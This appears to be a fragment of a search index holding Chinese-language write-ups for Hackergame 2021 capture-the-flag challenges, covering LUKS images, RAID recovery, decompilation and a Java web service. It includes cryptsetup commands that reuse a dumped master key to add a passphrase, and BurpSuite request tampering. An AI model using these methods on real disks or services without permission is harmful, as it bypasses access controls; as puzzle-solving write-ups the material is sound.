\u518d\u770b\u9898\u76ee\uff0c\u53cd\u590d\u8bf4\u4e86 U \u76d8\uff0c\u6240\u4ee5\u8fd9\u4e24\u4e2a img \u5e94\u8be5\u662f\u540c\u4e00\u4e2a U \u76d8\u7684\u955c\u50cf\u6587\u4ef6\uff0c\u53ea\u662f\u66f4\u6539\u4e86\u5bc6\u7801\u800c\u5df2\uff08file \u770b\u5230\u7684 uuid \u4e5f\u662f\u4e00\u81f4\u7684\uff09 \u4e8e\u662f\u7ee7\u7eed\u5fc5\u5e94\uff0c\u53d1\u73b0\u540c\u4e00\u4e2a\u78c1\u76d8\u7684 master-key \u662f\u4e00\u6837\u7684\uff0c\u800c\u4e14\u53ef\u4ee5\u7528 master-key \u6765\u6dfb\u52a0\u5bc6\u7801\u6062\u590d\u78c1\u76d8\uff08\u89c1\uff1a 10 Linux cryptsetup Examples for LUKS Key Management \uff09 \u6240\u4ee5\u5c31\u8ddf\u7740\u6587\u7ae0\u91cc\u7684\u505a\u6cd5\uff0c\u4ece\u7b2c\u4e00\u4e2a img \u4e2d\u63d0\u53d6\u51fa master-key\uff0c\u7136\u540e\u7528\u5b83\u6765\u63d0\u4f9b AddKey \u7684\u6743\u9650\u3002\u6dfb\u52a0\u4e86\u65b0 passphrase \u540e\u5c31\u53ef\u4ee5\u7528\u65b0\u5bc6\u7801\u6253\u5f00\u78c1\u76d8\u4e86\uff1a $ cryptsetup luksDump --dump-master-key MyDisk.img # \u8f93\u51fa master-key ... MK dump: be 97 db 91 5c 30 47 ce 1c 59 c5 c0 8c 75 3c 40 72 35 85 9d fe 49 c0 52 c4 f5 26 60 af 3e d4 2c ec a3 60 53 aa 96 70 4d f3 f2 ff 56 8f 49 a1 82 60 18 7c 58 d7 6a ec e8 00 c1 90 c1 88 43 f8 9a $ cat \"be...9a\" > master_key.txt # \u5b58\u5165\u6587\u4ef6 $ xxd -r -p master_key.txt master_key.bin # \u8f6c\u4e3a\u4e8c\u8fdb\u5236 $ cryptsetup luksAddKey MyDisk2.img --master-key-file < ( cat master_key.bin ) # \u6dfb\u52a0\u5bc6\u7801 Enter new passphrase for key slot: # \u8f93\u5165\u65b0\u5bc6\u7801\u5373\u53ef\uff0c\u56e0\u4e3amaster-key-file\u76f8\u5f53\u4e8e\u63d0\u4f9b\u4e86\u539f\u59cb\u5bc6\u7801 Verify passphrase: \uff08\u4e00\u5b9a\u8981\u7528 root \u6743\u9650\u624d\u53ef\u4ee5\u52a0\u5bc6\u7801\uff09 \u7136\u540e\u6302\u8f7d\u3001\u8f93\u5165\u5bc6\u7801\uff0c\u5c31\u53ef\u4ee5\u770b\u5230 flag.txt \u4e86","title":"\u52a0\u5bc6\u7684 U \u76d8"},{"location":"writeups/hackergame2021/#_9","text":"\u867d\u7136\u8fd9\u662f\u4f60\u7684\u9910\u5385\uff0c\u4f46\u53ea\u6709\u673a\u5668\u4eba\u53ef\u4ee5\u5728\u53a8\u623f\u5de5\u4f5c\u3002\u673a\u5668\u4eba\u7cbe\u786e\u5730\u6309\u7167\u7a0b\u5e8f\u5de5\u4f5c\uff0c\u5728\u53a8\u623f\u4e2d\u79fb\u52a8\uff0c\u4ece\u7269\u54c1\u6e90\u53d6\u51fa\u98df\u6750\uff0c\u6309\u7167\u83dc\u8c31\u7684\u987a\u5e8f\u628a\u98df\u6750\u4f9d\u6b21\u653e\u5165\u9505\u5185\u3002 \u673a\u5668\u4eba\u4e0d\u9700\u8981\u4f11\u606f\uff0c\u53ea\u9700\u8981\u4e00\u4e2a\u665a\u4e0a\u7684\u65f6\u95f4\u6765\u5b66\u4e60\u4f60\u6559\u7ed9\u5b83\u7684\u7a0b\u5e8f\uff0c\u5728\u6b64\u4e4b\u540e\u4f60\u5c31\u53ef\u4ee5\u5728\u4efb\u4f55\u65f6\u5019\u8ba9\u673a\u5668\u4eba\u6267\u884c\u8fd9\u4e2a\u7a0b\u5e8f\uff0c\u7a0b\u5e8f\u7684\u6bcf\u4e00\u6b65\u6267\u884c\u90fd\u4f1a\u88ab\u8bb0\u5f55\u4e0b\u6765\uff0c\u65b9\u4fbf\u4f60\u68c0\u67e5\u673a\u5668\u4eba\u505a\u83dc\u7684\u8fc7\u7a0b\u3002 \u53e6\u5916\u4e3a\u4e86\u7b26\u5408\u98df\u54c1\u5b89\u5168\u6cd5\u7684\u8981\u6c42\uff0c\u8d5b\u535a\u53a8\u623f\u4e2d\u7684\u673a\u5668\u4eba\u540c\u4e00\u65f6\u95f4\u624b\u91cc\u53ea\u80fd\u62ff\u4e00\u79cd\u98df\u7269\uff0c\u6bcf\u6b21\u505a\u83dc\u524d\u90fd\u5fc5\u987b\u6267\u884c\u6e05\u7406\u53a8\u623f\u7684\u64cd\u4f5c\uff0c\u628a\u5404\u5904\u7684\u98df\u7269\u6b8b\u6e23\u6e05\u7406\u6389\uff0c\u7136\u540e\u56de\u5230\u53a8\u623f\u89d2\u843d\u5f85\u547d\u3002 \u6bcf\u5929\u7684\u83dc\u8c31\u53ef\u80fd\u4e0d\u540c\uff0c\u4f46\u4e5f\u8bb8\u4e5f\u5b58\u5728\u4e00\u4e9b\u89c4\u5f8b\u3002 \u5bf9\u673a\u5668\u4eba\u7f16\u7a0b\u53ef\u4ee5\u4f7f\u7528\u7684\u6307\u4ee4\u6709\uff08n, m \u4e3a\u6574\u6570\u53c2\u6570\uff0c\u7a0b\u5e8f\u7684\u884c\u53f7\u4ece 0 \u5f00\u59cb\uff0c\u6ce8\u610f\u6307\u4ee4\u4e2d\u9700\u8981\u6b63\u786e\u4f7f\u7528\u7a7a\u683c\uff09\uff1a \u5411\u4e0a n \u6b65 \u5411\u4e0b n \u6b65 \u5411\u5de6 n \u6b65 \u5411\u53f3 n \u6b65 \u653e\u4e0b n \u4e2a\u7269\u54c1 \u62ff\u8d77 n \u4e2a\u7269\u54c1 \u653e\u4e0b\u76d8\u5b50 \u62ff\u8d77\u76d8\u5b50 \u5982\u679c\u624b\u4e0a\u7684\u7269\u54c1\u5927\u4e8e\u7b49\u4e8e n \u5411\u4e0a\u8df3\u8f6c m \u884c \u5982\u679c\u624b\u4e0a\u7684\u7269\u54c1\u5927\u4e8e\u7b49\u4e8e n \u5411\u4e0b\u8df3\u8f6c m \u884c \u8d76\u7d27\u8fdb\u5165\u8d5b\u535a\u53a8\u623f\u5f00\u59cb\u505a\u83dc\u5427\uff01 \u521a\u770b\u9898\u8fd8\u662f\u633a\u61f5\u7684\uff0c\u60f3\u4e86\u597d\u534a\u5929\u624d\u660e\u767d \u7b80\u5355\u8bf4\u6765\u5c31\u662f\uff0c\u6bcf\u5929\u53ef\u4ee5\u7f16\u5199\u65b0\u7684\u7a0b\u5e8f\uff0c\u4f46\u662f\u53ea\u80fd\u8fd0\u884c\u4e00\u4e2a\u4e4b\u524d\u7f16\u5199\u8fc7\u7684\u7a0b\u5e8f \u6bcf\u4e2a\u7a0b\u5e8f\u53ea\u6709\u51e0\u79cd\u6307\u4ee4\u53ef\u4ee5\u4f7f\u7528\uff0c\u9700\u8981\u5728\u5176\u4e2d\u6ee1\u8db3\u83dc\u8c31\u7684\u987a\u5e8f\u8981\u6c42 \u800c\u95ee\u9898\u5728\u4e8e\uff0c\u7f16\u5199\u7a0b\u5e8f\u540e\u7684\u7b2c\u4e8c\u5929\u7684\u83dc\u8c31\u53ef\u80fd\u4f1a\u4e0d\u540c\uff0c\u5bfc\u81f4\u524d\u9762\u7f16\u5199\u7684\u7a0b\u5e8f\u65e0\u6cd5\u4f7f\u7528 \u6240\u4ee5\u5c31\u9700\u8981 \u9884\u6d4b \u7b2c\u4e8c\u5929\u7684\u83dc\u8c31","title":"\u8d5b\u535a\u53a8\u623f"},{"location":"writeups/hackergame2021/#level-0","text":"\u53ef\u4ee5\u770b\u5230\u7b2c 0 \u5929\u7684\u83dc\u8c31\u662f 1, 0\uff0c\u4e5f\u5c31\u662f\u8981\u5728\u540c\u4e00\u4e2a\u7a0b\u5e8f\u4e2d\u4f9d\u6b21\u5411\u9505(1,0)\u4e2d\u653e\u5165 1 \u53f7\u98df\u7269(0,2)\u548c 0 \u53f7\u98df\u7269(0,1) \u968f\u4fbf\u7f16\u5199\u7a0b\u5e8f\u4fdd\u5b58\uff0c\u76f4\u63a5\u5230\u4e0b\u4e00\u5929\uff0c\u53ef\u4ee5\u53d1\u73b0\u83dc\u8c31\u53d1\u751f\u4e86\u53d8\u5316 \u591a\u6b21\u5c1d\u8bd5\u4e4b\u540e\u53d1\u73b0\u83dc\u8c31 \u53ea\u6709 0,0 / 0,1 / 1,0 / 1,1 \u56db\u79cd \u6240\u4ee5\u5728\u7b2c 0 \u5929\u7f16\u5199\u5b66\u4e60\u56db\u4e2a\u7a0b\u5e8f\uff0c\u5230\u4e0b\u4e00\u5929\u5c31\u53ef\u4ee5\u6839\u636e\u83dc\u8c31\u6765\u6267\u884c\u4e86 \u4f8b\u5982\u7a0b\u5e8f 1,0 \u5c31\u53ef\u4ee5\u7f16\u5199\u4e3a\uff1a \u5411\u53f3 2 \u6b65 \u62ff\u8d77 1 \u4e2a\u7269\u54c1 \u5411\u5de6 2 \u6b65 \u5411\u4e0b 1 \u6b65 \u653e\u4e0b 1 \u4e2a\u7269\u54c1 \u5411\u4e0a 1 \u6b65 \u5411\u53f3 1 \u6b65 \u62ff\u8d77 1 \u4e2a\u7269\u54c1 \u5411\u5de6 1 \u6b65 \u5411\u4e0b 1 \u6b65 \u653e\u4e0b 1 \u4e2a\u7269\u54c1 \u5411\u4e0a 1 \u6b65 \u53ea\u8981\u6b63\u786e\u4e86\u4e00\u5929\uff0c\u5c31\u53ef\u4ee5\u62ff\u5230 flag \u4e86","title":"Level 0"},{"location":"writeups/hackergame2021/#level-1","text":"\u53ea\u6709 1 \u4e2a\u98df\u7269\uff0c\u83dc\u8c31\u662f\u597d\u591a 0 \u540c\u6837\u968f\u4fbf\u7f16\u5199\u7a0b\u5e8f\u4fdd\u5b58\u8fdb\u5165\u4e0b\u4e00\u5929\uff0c\u53d1\u73b0\u83dc\u8c31 \u6ca1\u6709\u53d8\u5316 \uff0c\u8fd8\u662f 73 \u4e2a 0 \u6240\u4ee5\u8fd9\u4e00\u5173\u53ef\u80fd\u53ea\u662f\u5faa\u73af\u7684\u6559\u7a0b \u53ef\u7528\u7684\u6307\u4ee4\u4e2d\u6709\u4e00\u6761 \u201c\u5982\u679c\u624b\u4e0a\u7684\u7269\u54c1\u5927\u4e8e\u7b49\u4e8e n \u5411\u4e0a\u8df3\u8f6c m \u884c\u201d \u53ef\u4ee5\u7528\u5b83\u6765\u8fbe\u5230 \u5faa\u73af \u7684\u6548\u679c \u53ea\u9700\u8981\u62ff 73 \u4e2a\u7269\u54c1\uff0c\u7136\u540e\u5faa\u73af\u653e\u4e0b\u76f4\u5230\u624b\u4e2d\u6ca1\u6709\u4e86\u5373\u53ef \u5411\u53f3 1 \u6b65 \u62ff\u8d77 73 \u4e2a\u7269\u54c1 \u5411\u5de6 1 \u6b65 \u5411\u4e0b 1 \u6b65 \u653e\u4e0b 1 \u4e2a\u7269\u54c1 \u5982\u679c\u624b\u4e0a\u7684\u7269\u54c1\u5927\u4e8e\u7b49\u4e8e 1 \u5411\u4e0a\u8df3\u8f6c 1 \u884c \u540c\u6837\u4fdd\u5b58\u4e0b\u4e00\u5929\u6267\u884c\u5c31\u53ef\u4ee5\u62ff\u5230 flag \u4e86 \u5269\u4e0b\u7684\u4e24\u4e2a\u770b\u8d77\u6765\u5927\u6982\u662f\u901a\u8fc7\u6e90\u7801\u6765\u63a8\u6d4b\u51fa\u83dc\u8c31\u7684\u751f\u6210\u65b9\u6cd5\uff0c\u7136\u540e\u7f16\u5199\u76f8\u5e94\u7684\u6307\u4ee4\uff0c\u592a\u96be\u4e86\uff0c\u4e0d\u4f1aqwq","title":"Level 1"},{"location":"writeups/hackergame2021/#micro-world","text":"\u5b87\u5b99\u4e2d\u67d0\u4e00\u7247\u6781\u5176\u5fae\u5c0f\u7684\u533a\u57df\u91cc\u7684\u7c92\u5b50\u88ab\u4e00\u80a1\u795e\u79d8\u529b\u91cf\u521d\u59cb\u5316\u8bbe\u7f6e\u6210\u4e86 flag \u7684\u5f62\u72b6\uff0c\u7a0b\u5e8f\u5fe0\u5b9e\u5730\u8bb0\u5f55\u4e86\u4e00\u6bb5\u65f6\u95f4\u4e4b\u540e\u8fd9\u7247\u533a\u57df\u7684\u7c92\u5b50\u8fd0\u52a8\u60c5\u51b5\u3002 \u62ff\u5230\u4e86 exe \u6587\u4ef6\uff0c\u770b\u8d77\u6765\u633a\u7cbe\u81f4\uff0c\u8fd0\u884c\u8d77\u6765\u662f\u4e00\u4e9b\u70b9\u8fd0\u52a8\u78b0\u649e\u7684\u573a\u666f \u62d6\u5230 IDA \u91cc\u770b\u770b\uff0c\u53d1\u73b0\u4e86 __main__ \u4ee5\u53ca .rdata \u91cc\u4e00\u4e9b py \u6709\u5173\u7684\u5b57\u7b26\u4e32\uff1a \u6240\u4ee5\u63a8\u6d4b\u662f\u4f7f\u7528 python \u7f16\u5199\u7684\uff0c\u7136\u540e\u7528 pyinstaller \u6253\u5305 \u8fd9\u6837\u7684\u8bdd\u8bd5\u7740\u7528 pyinstxtractor \u89e3\u5305 .exe\uff0c\u6210\u529f\u5f97\u5230\u4e00\u4e2a\u6587\u4ef6\u5939 \u91cc\u9762\u662f\u4e00\u5806 .pyc .pyd .dll \u6587\u4ef6\uff0c\u4ece\u540d\u5b57\u5c31\u53ef\u4ee5\u770b\u51fa\u5927\u90e8\u5206\u662f import \u7684\u5305\uff0c\u53ea\u6709\u4e00\u4e2a\u7279\u522b\u7684 2.pyc \u6240\u4ee5\u8fd9\u4e2a\u5e94\u8be5\u5c31\u662f\u7f16\u8bd1\u540e\u7684\u6e90\u7801\u4e86 \u63a5\u4e0b\u6765\u7528 uncompyle6 \u6765\u53cd\u7f16\u8bd1 pyc \u6587\u4ef6\uff0c\u8f93\u51fa\u5f97\u5230\u4e86\u6e90\u7801 2.py \u5c1d\u8bd5\u8fd0\u884c\uff0c\u53d1\u73b0\u8dd1\u8d77\u6765\u4e4b\u540e\u53ea\u6709\u4e00\u4e2a\u70b9\u5728\u8fd0\u52a8\uff0c\u5e94\u8be5\u662f\u53cd\u7f16\u8bd1\u65f6\u51fa\u4e86\u4e9b\u95ee\u9898 \u4e8e\u662f\u5f00\u59cb\u770b\u6e90\u7801 \u57fa\u672c\u4e0a\u7b80\u5355\u8bf4\u5c31\u662f\uff0c\u521d\u59cb\u6709\u4e00\u4e9b\u6570\u636e\uff0c\u8868\u793a\u6bcf\u4e2a\u70b9\u7684\u4f4d\u7f6e\u548c\u901f\u5ea6\uff0c\u7136\u540e\u8fd0\u884c\uff0c\u6bcf\u6b21\u8fd0\u884c\u90fd\u68c0\u6d4b\u78b0\u649e\uff0c\u7136\u540e\u83b7\u5f97\u65b0\u7684\u70b9\u4f4d\u7f6e\uff0c\u518d\u7ed8\u5236\u51fa\u6765 \u8c03\u8bd5\u4e00\u4e0b\uff0c\u8f93\u51fa\u6bcf\u6b21\u7684 pointlist\uff0c\u53d1\u73b0\u7b2c\u4e00\u6b21\u662f\u6240\u6709\u70b9\uff0c\u7b2c\u4e8c\u6b21\u53d8\u62102\u4e2a\uff0c\u7b2c\u4e09\u6b21\u5f80\u540e\u5c31\u53ea\u6709\u4e00\u4e2a\u4e86 \u6240\u4ee5\u95ee\u9898\u5927\u6982\u5c31\u51fa\u5728\u4e86 next_pos_list \u51fd\u6570\uff1a def next_pos_list ( Pointlist ): pointlist = [] for i in range ( len ( Pointlist )): for point in Pointlist [ i + 1 :]: times = checkcrush ( Pointlist [ i ], point ) if times != None : a , b = get_new_point ( times , Pointlist [ i ], point ) pointlist . extend ([ a , b ]) Pointlist [ i ] . flag = 0 point . flag = 0 else : for item in Pointlist : if item . flag != 0 : pointlist . append ( Point (( item . x + item . vx , item . y + item . vy ), item . vx , item . vy )) for poi in pointlist : poi . x = poi . x % WIDTH poi . y = poi . y % HEIGHT else : return pointlist \u4ed4\u7ec6\u8bfb\u4e00\u8bfb\uff0c\u53ef\u4ee5\u53d1\u73b0\u8fd9\u91cc\u9762\u7684 for-else \u5757\u5f88\u5947\u602a\uff0c\u5bfc\u81f4\u5faa\u73af\u7ed3\u675f\u548c return \u90fd\u65e9\u4e86\uff0c\u6240\u4ee5\u6839\u636e\u51fd\u6570\u7684\u610f\u601d\u6539\u4e00\u6539\uff1a def next_pos_list ( Pointlist ): pointlist = [] for i in range ( len ( Pointlist )): for point in Pointlist [ i + 1 :]: ... for item in Pointlist : ... return pointlist \u8fd9\u6837\u5c31\u53ef\u4ee5\u6210\u529f\u8fd0\u884c\u4e86 \u4f46\u662f\u753b\u9762\u4ecd\u7136\u662f\u6742\u4e71\u7684\u3002\u56e0\u4e3a\u9898\u91cc\u8bf4\u4e86 \u201c\u8bb0\u5f55\u4e86 \u4e00\u6bb5\u65f6\u95f4\u4e4b\u540e \u8fd9\u7247\u533a\u57df\u7684\u7c92\u5b50\u8fd0\u52a8\u60c5\u51b5\u201d \u6240\u4ee5\u9700\u8981\u5c06\u8f68\u8ff9\u5f80\u524d\u63a8\uff0c\u6700\u65b9\u4fbf\u7684\u65b9\u6cd5\u5c31\u662f\u66f4\u6539\u6bcf\u4e2a\u70b9\u7684\u901f\u5ea6\u65b9\u5411\uff1a Pointlist = [] for item in list_ : Pointlist . append ( Point (( item [ 0 ], item [ 1 ]), - item [ 2 ], - item [ 3 ])) \u8fd0\u884c\u540e\u7b49\u5f85\u4e00\u5c0f\u4f1a\u513f\u5c31\u53ef\u4ee5\u770b\u5230\u70b9\u9010\u6e10\u6709\u5e8f\uff0c\u5728\u67d0\u4e00\u523b\u6c47\u6210\u4e86 flag\uff1a \u867d\u7136\u4e0d\u592a\u6e05\u6670\uff0c\u4f46\u662f\u4e5f\u53ef\u4ee5\u731c\u4e2a\u5927\u6982","title":"Micro World"},{"location":"writeups/hackergame2021/#_10","text":"\uff08\u8fd9\u9898\u6574\u6574\u505a\u4e86\u6211\u4e24\u5929\u591a\uff0c\u6bcf\u5929\u665a\u4e0a\u90fd\u5bf9\u7740\u78c1\u76d8\u9635\u5217\u2026\u2026\uff09 \u4ee5\u4e0b\u662f\u4e24\u4e2a\u538b\u7f29\u5305\uff0c\u5206\u522b\u662f\u4e00\u4e2a RAID 0 \u9635\u5217\u7684\u78c1\u76d8\u538b\u7f29\u5305\uff0c\u548c\u4e00\u4e2a RAID 5 \u9635\u5217\u7684\u78c1\u76d8\u538b\u7f29\u5305\uff0c\u5bf9\u5e94\u672c\u9898\u7684\u4e24\u5c0f\u95ee\u3002\u4f60\u9700\u8981\u89e3\u6790\u5f97\u5230\u6b63\u786e\u5b8c\u6574\u7684\u78c1\u76d8\u9635\u5217\uff0c\u6302\u8f7d\u7b2c\u4e00\u4e2a\u5206\u533a\u540e\u5728\u8be5\u5206\u533a\u6839\u76ee\u5f55\u4e0b\u4f7f\u7528 Python 3.7 \u6216\u4ee5\u4e0a\u7248\u672c\u6267\u884c getflag.py \u811a\u672c\u4ee5\u83b7\u53d6 flag\u3002\u78c1\u76d8\u6570\u636e\u4fdd\u8bc1\u65e0\u635f\u574f\u3002","title":"\u9635\u5217\u6062\u590d\u5927\u5e08"},{"location":"writeups/hackergame2021/#raid-5","text":"\u867d\u7136 RAID 5 \u662f\u7b2c\u4e8c\u95ee\uff0c\u800c\u4e14\u5206\u6570\u9ad8\uff0c\u4f46\u662f\u66f4\u597d\u505a\uff0c\u800c\u4e14\u505a\u51fa\u7684\u4eba\u4e5f\u591a\u3002 \u56e0\u4e3a\u6570\u636e\u4fdd\u8bc1\u65e0\u635f\u574f\uff0c\u6240\u4ee5\u8981\u505a\u7684\u4ec5\u4ec5\u662f\u627e\u51fa\u4e94\u4e2a\u78c1\u76d8\u7684\u987a\u5e8f\u548c\u5757\u5927\u5c0f \u987a\u5e8f\u53ef\u4ee5\u5148\u7b80\u5355\u5730\u770b\u770b strings *.img \u8f93\u51fa\u7684\u5185\u5bb9 \u9010\u4e2a\u6587\u4ef6\u770b\uff0c\u53ef\u4ee5\u53d1\u73b0\u6bcf\u4e2a\u6587\u4ef6\u6bd4\u8f83\u9760\u524d\u7684\u5730\u65b9\u4f1a\u6709\u4e00\u6bb5\u662f git \u5386\u53f2\u8bb0\u5f55\u7684\u4e00\u90e8\u5206: \u6839\u636e\u91cc\u9762\u7684\u65f6\u95f4\u53ef\u4ee5\u63a8\u65ad\u51fa\u78c1\u76d8\u7684\u987a\u5e8f\u5927\u81f4\u662f\uff1a Qj... -> 60... -> 3R... -> Ir... -> 3D... \u53ea\u662f\uff0c\u8fd9\u4e2a\u987a\u5e8f\u5e94\u8be5\u662f\u4e00\u4e2a\u73af\uff0c\u8c01\u5728\u7b2c\u4e00\u8fd8\u6ca1\u533a\u5206\u51fa\u6765 \u5728\u770b\u6bcf\u4e2a\u6587\u4ef6\u7684\u5934\u90e8\uff0c\u53ea\u6709 60... \u548c 3R... \u6709 \u201cEFI PART\u201d: \u6240\u4ee5\u5e94\u8be5\u662f\u4e00\u4e2a\u5728\u5f00\u5934\uff0c\u4e00\u4e2a\u5728\u7ed3\u5c3e\u3002\u6240\u4ee5\u6700\u7ec8\u7684\u987a\u5e8f\u662f\uff1a 3R... -> Ir... -> 3D... -> Qj... -> 60... \u7136\u540e\u9700\u8981\u627e\u5230\u5757\u5927\u5c0f \u76f4\u63a5\u4e22\u5230 DiskGenius \u91cc\u7ec4\u5efa\u865a\u62df RAID\uff0c\u9009\u5de6\u540c\u6b65\uff0c\u7136\u540e\u53ef\u4ee5\u8bd5\u51fa\u6765\u5f53\u5757\u5927\u5c0f\u662f 64k \u7684\u65f6\u5019\u6b63\u597d\u53ef\u4ee5\u62fc\u51fa\u5b8c\u6574\u78c1\u76d8 \u7136\u540e\u514b\u9686\u78c1\u76d8\u751f\u6210 img \u6587\u4ef6\uff0c\u518d\u6302\u8f7d\uff0c\u8fdb\u5165\uff0c\u6267\u884c getflag.py \u5c31\u5f97\u5230\u4e86 flag","title":"RAID 5"},{"location":"writeups/hackergame2021/#raid-0","text":"\u5728\u505a RAID 5 \u7684\u65f6\u5019\u8fd8\u53d1\u73b0\u4e86\u4e00\u4e2a\u53eb Raid Reconstructor \u7684\u8f6f\u4ef6\uff0c\u53ef\u4ee5\u7206\u7834 RAID \u9635\u5217\u987a\u5e8f\u548c\u5757\u5927\u5c0f \u6240\u4ee5\u8fd9\u95ee\u4e5f\u5c31\u61d2\u5f97\u770b\u4e86\uff0c\u76f4\u63a5\u4e22\u7ed9 Raid Reconstructor \u6765\u7206\u7834\uff0c\u5f97\u5230\u6700\u63a8\u8350\u7684\u987a\u5e8f\uff1a wl. -> jC. -> 1G. -> 5q. -> d3. -> eR. -> RA. -> ID. \u548c\u5757\u5927\u5c0f 128k \u7136\u540e\u76f4\u63a5\u7528 Raid Reconstructor \u7684 Copy \u5bfc\u51fa img \u6587\u4ef6\uff0c\u63d0\u53d6\u540e\u53c8\u5f97\u5230\u4e00\u4e2a\u65b0\u7684 img \u6587\u4ef6 \u901a\u8fc7 file \u53ef\u4ee5\u770b\u5230\u7ed3\u679c\u7684\u6587\u4ef6\u7cfb\u7edf\u662f XFS $ file MyDisk.img MyDisk.img: SGI XFS filesystem data ( blksz 4096 , inosz 512 , v2 dirs ) \u4f46\u662f\u59cb\u7ec8\u65e0\u6cd5\u6302\u8f7d\uff08\u641e\u4e86\u4e00\u5929\uff09 \u53ef\u80fd\u662f Raid Reconstructor \u7684\u95ee\u9898\uff0c\u6240\u4ee5\u53c8\u7528 DiskGenius \u8bd5\u4e86\u4e0b \u56e0\u4e3a win \u548c DiskGenius \u8bfb\u4e0d\u4e86 XFS \u6587\u4ef6\u7cfb\u7edf\uff0c\u6240\u4ee5\u62fc\u8d77\u6765\u4e4b\u540e\u76f4\u63a5\u514b\u9686\u51fa img \u6587\u4ef6 \u7136\u540e\u62d6\u5230 Kali Linux \u91cc\u6302\u8f7d\uff0c\u6210\u529f\u6302\u8f7d\u540e\u8fdb\u5165\u3001\u8fd0\u884c getflag.py \u5c31\u5f97\u5230\u4e86 flag","title":"RAID 0"},{"location":"writeups/hackergame2021/#_11","text":"\u9898\u76ee\u6709\u6548\u5185\u5bb9\uff1a \u4f60\u7684\u5ba4\u53cb\u7ec8\u4e8e\u8fde\u591c\u8d76\u5b8c\u4e86\u4ed6\u7684 Java \u8bed\u8a00\u7a0b\u5e8f\u8bbe\u8ba1\u7684\u8bfe\u7a0b\u5927\u4f5c\u4e1a\u3002\u770b\u8d77\u6765\u4ed6\u4f7f\u7528 Java 17 \u5199\u4e86\u4e00\u4e2a\u4fdd\u5b58\u52a9\u8bb0\u8bcd\u7684\u540e\u7aef\uff0c\u5f53\u7136\u8fd8\u6709\u914d\u5957\u7684\u524d\u7aef\u3002\u52a9\u8bb0\u8bcd\u7531\u56db\u4e2a\u82f1\u6587\u5355\u8bcd\u7ec4\u6210\uff0c\u6bcf\u4e2a\u7528\u6237\u6700\u591a\u4fdd\u5b58 32 \u6761\u3002 \u4f60\u4ece\u4ed6\u5145\u6ee1\u6fc0\u60c5\u5374\u53c8\u5939\u6742\u4e0d\u6e05\u7684\u8868\u8ff0\u4e2d\u5f97\u77e5\uff0c\u4ed6\u4f3c\u4e4e\u8fd8\u4e3a\u6b64\u4e13\u95e8\u5728\u5927\u4f5c\u4e1a\u91cc\u85cf\u4e86\u4e24\u4e2a flag\uff1a\u5f53\u8bbf\u95ee\u5ef6\u8fdf\u8fbe\u5230\u4e24\u4e2a\u7279\u6b8a\u7684\u9608\u503c\u65f6\uff0cflag \u4fbf\u4f1a\u6253\u5370\u51fa\u6765\uff0c\u5c4a\u65f6\u4f60\u4fbf\u53ef\u4ee5\u62ff\u7740 flag \u8ba9\u4f60\u7684\u5ba4\u53cb\u8bf7\u4f60\u5403\u4e00\u987f\u5927\u9910\u3002 \u4e0b\u8f7d\u5230\u6e90\u7801\u540e\u7ffb\u4e00\u7ffb\uff0c\u6709\u7528\u7684\u5c31\u53ea\u6709 Phrase.java \u548c Instance.java \u5176\u4e2d Phrase.java \u5b9a\u4e49\u4e86 Phrase\uff0c\u5176\u4e2d\u91cd\u8f7d\u4e86 equals \u65b9\u6cd5\uff0c\u5176\u4e2d\u6709\uff1a try { TimeUnit . MILLISECONDS . sleep ( EQUALS_DURATION_MILLIS ); // 20ms // TODO: remove it since it is for debugging } catch ( InterruptedException e ) { throw new RuntimeException ( e ); } \u6240\u4ee5\u5728\u6bcf\u6b21\u6bd4\u8f83\u76f8\u7b49\u7684\u65f6\u5019\u5c31\u4f1a sleep 20ms \u800c Instance.java \u7684 post \u65b9\u6cd5\u4e2d\u5bf9\u4e8e\u6bcf\u6b21\u7684\u8f93\u5165\uff0c\u904d\u5386\u8f93\u5165\u7684\u5217\u8868\uff0c\u7136\u540e\u9010\u4e2a\u52a0\u8fdb HashMap \u4e2d \u5728\u52a0\u5165 HashMap \u7684\u65f6\u5019\u5c31\u6d89\u53ca\u5230\u5224\u65ad\u662f\u5426\u76f8\u7b49 \u800c\u6700\u7ec8\u4f1a\u5224\u65ad\u5728\u5b8c\u6210\u524d\u540e\u7684\u603b\u7684\u65f6\u95f4\u95f4\u9694\u662f\u591a\u5c11\uff0c\u5982\u679c\u5927\u4e8e 600ms \u5c31\u63d0\u53d6\u51fa\u7b2c\u4e00\u4e2a flag\uff1a var modified = 0 ; var before = System . nanoTime (); for ( var i = 0 ; i < input . length () && i < MAX_PHRASES && phrases . size () < MAX_PHRASES ; ++ i ) { var text = input . optString ( i , \"\" ). toLowerCase ( Locale . ENGLISH ); modified += phrases . add ( Phrase . create ( this . mnemonics , text , token )) ? 1 : 0 ; // \u8fd9\u91cc\u4f1a sleep } var after = System . nanoTime (); var duration = TimeUnit . MILLISECONDS . convert ( after - before , TimeUnit . NANOSECONDS ); if ( duration > FLAG1_DURATION_MILLIS ) { // 600ms token . addFlag ( 1 , flag -> output . put ( \"flag1\" , flag )); } \u800c\u5728\u7f51\u9875\u4e2d\u6dfb\u52a0\u6761\u76ee\u7684\u65f6\u5019\uff0c\u4e00\u6b21\u53ea\u80fd\u6dfb\u52a0\u4e00\u6761\uff0c\u4e5f\u5c31\u662f\u4e00\u4e2a POST \u91cc\u9762\u53ea\u6709\u4e00\u4e2a Phrase \u4f46\u662f\u6e90\u7801\u4e2d\u6709\u4e00\u4e2a\u5faa\u73af\uff0c\u904d\u5386\u6574\u4e2a input\uff0c\u6240\u4ee5\u4e00\u4e2a POST \u91cc\u7684\u5185\u5bb9\u5176\u5b9e\u662f\u4e00\u4e2a\u5217\u8868 \u6240\u4ee5\u53ef\u4ee5\u7528 BurpSuite \u83b7\u53d6 POST \u7136\u540e\u66f4\u6539\u4e00\u4e0b\u5185\u5bb9\u518d\u53d1\u9001\u51fa\u53bb\uff08\u5148 random \u4e00\u4e2a\uff0c\u7136\u540e add\uff09 \u6839\u636e flag \u91cc\u7684\u63d0\u793a\uff0c\u6b63\u89e3\uff08\u7b2c\u4e8c\u987f\u5927\u9910\uff09\u5e94\u8be5\u662f\u4f7f\u7528\u54c8\u5e0c\u78b0\u649e\uff0c \u4f46\u662f\u4e0d\u4f1a","title":"\u52a9\u8bb0\u8bcd"},{"location":"writeups/hackergame2021/#_12","text":"\uff08\u8fd9\u9053\u9898\u5df2\u7ecf\u505a\u7834\u9632\u4e86\uff0c\u672c\u4ee5\u4e3a\u662f\u4e2a\u9752\u94dc\uff0c\u7ed3\u679c\u662f\u4e2a\u738b\u8005\u2026\u2026\uff09 